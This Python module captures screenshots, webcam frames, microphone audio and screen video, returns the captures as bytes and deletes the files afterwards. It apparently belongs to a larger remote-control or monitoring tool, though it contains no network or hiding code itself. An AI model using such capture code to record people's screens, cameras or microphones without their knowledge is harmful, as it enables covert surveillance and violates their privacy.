"""
Media Capture Module
Screenshot, Webcam, Audio, Video recording

Developer: TsByin
Version: 12.0
"""

import os
import time
import logging
import cv2
import numpy as np
import pyautogui
import wave
import pyaudio

logger = logging.getLogger(__name__)

# ==============================================================================
# SCREENSHOT
# ==============================================================================

def smart_screenshot():
    """Smart screenshot with compression"""
    try:
        img = pyautogui.screenshot()
        img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        # Use PNG (lossless) to avoid blur on desktop captures
        success, encoded_img = cv2.imencode('.png', img)
        
        if success:
            logger.info("Screenshot captured successfully")
            return encoded_img.tobytes()
        else:
            logger.error("Screenshot encoding failed")
            return None
    except Exception as e:
        logger.error(f"smart_screenshot failed: {e}")
        return None

# ==============================================================================
# WEBCAM
# ==============================================================================

def capture_webcam():
    """Capture single frame from webcam"""
    cap = None
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            logger.error("Webcam not available")
            return None
        
        ret, frame = cap.read()
        if not ret:
            logger.error("Failed to read webcam frame")
            return None
        
        success, encoded_img = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
        if success:
            logger.info("Webcam frame captured")
            return encoded_img.tobytes()
        else:
            logger.error("Webcam encoding failed")
            return None
    
    except Exception as e:
        logger.error(f"capture_webcam failed: {e}")
        return None
    finally:
        if cap is not None:
            try:
                cap.release()
            except:
                pass

# ==============================================================================
# AUDIO RECORDING
# ==============================================================================

def record_audio(seconds=10, filename="rec.wav"):
    """Record audio from microphone — duration now configurable"""
    try:
        import pyaudio

        logger.info(f"Recording audio for {seconds} seconds...")

        p = pyaudio.PyAudio()
        stream = p.open(
            format=pyaudio.paInt16,
            channels=1,          # mono is enough and reduces file size
            rate=44100,
            input=True,
            frames_per_buffer=1024
        )

        frames = []
        for _ in range(0, int(44100 / 1024 * seconds)):
            try:
                frames.append(stream.read(1024, exception_on_overflow=False))
            except Exception as e:
                logger.warning(f"Audio frame read failed: {e}")
                break

        stream.stop_stream()
        stream.close()
        p.terminate()

        wf = wave.open(filename, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))
        wf.close()

        logger.info(f"Audio recorded: {filename} ({seconds}s)")
        return True

    except ImportError:
        logger.error("PyAudio not available")
        return False
    except Exception as e:
        logger.error(f"record_audio failed: {e}")
        return False

# ==============================================================================
# VIDEO RECORDING
# ==============================================================================

def record_screen(seconds=10, filename="screen.mp4"):
    """Record screen to MP4 (H264 via mp4v fallback) — duration configurable.
    Falls back to XVID AVI if mp4v codec unavailable."""
    out = None
    try:
        logger.info(f"Recording screen for {seconds} seconds...")

        screen_size = pyautogui.size()
        fps = 15  # Lower FPS = smaller file, still watchable

        # Try MP4 first; fall back to AVI
        if filename.lower().endswith('.avi'):
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
        else:
            filename = os.path.splitext(filename)[0] + '.mp4'
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')

        out = cv2.VideoWriter(filename, fourcc, float(fps), screen_size)
        if not out.isOpened():
            logger.warning("mp4v not available, falling back to XVID AVI")
            filename = os.path.splitext(filename)[0] + '.avi'
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(filename, fourcc, 15.0, screen_size)

        if not out.isOpened():
            logger.error("Failed to create video writer")
            return False, filename

        target_frames = int(seconds * fps)
        frame_interval = 1.0 / fps
        next_frame_at = time.perf_counter()
        frame_count = 0

        for _ in range(target_frames):
            try:
                img = pyautogui.screenshot()
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                out.write(frame)
                frame_count += 1
            except Exception as e:
                logger.warning(f"Frame capture failed: {e}")

            next_frame_at += frame_interval
            sleep_for = next_frame_at - time.perf_counter()
            if sleep_for > 0:
                time.sleep(sleep_for)

        size_mb = 0
        try:
            size_mb = os.path.getsize(filename) / (1024 * 1024)
        except:
            pass
        logger.info(f"Screen recorded: {frame_count} frames -> {filename} ({size_mb:.1f}MB)")
        return True, filename

    except Exception as e:
        logger.error(f"record_screen failed: {e}")
        return False, filename
    finally:
        if out is not None:
            try:
                out.release()
            except:
                pass

# ==============================================================================
# FILE MANAGEMENT
# ==============================================================================

def get_media_file_size(filename):
    """Get media file size in MB"""
    try:
        return os.path.getsize(filename) / (1024 * 1024)
    except:
        return 0

def cleanup_media_file(filename):
    """Clean up media file"""
    try:
        if os.path.exists(filename):
            os.remove(filename)
            logger.debug(f"Cleaned up: {filename}")
            return True
    except Exception as e:
        logger.error(f"Cleanup failed: {e}")

    return False
# ════════════════════════════════════════════════
# Developer: TsByin
# Module: Media Capture & Recording Functions
# ════════════════════════════════════════════════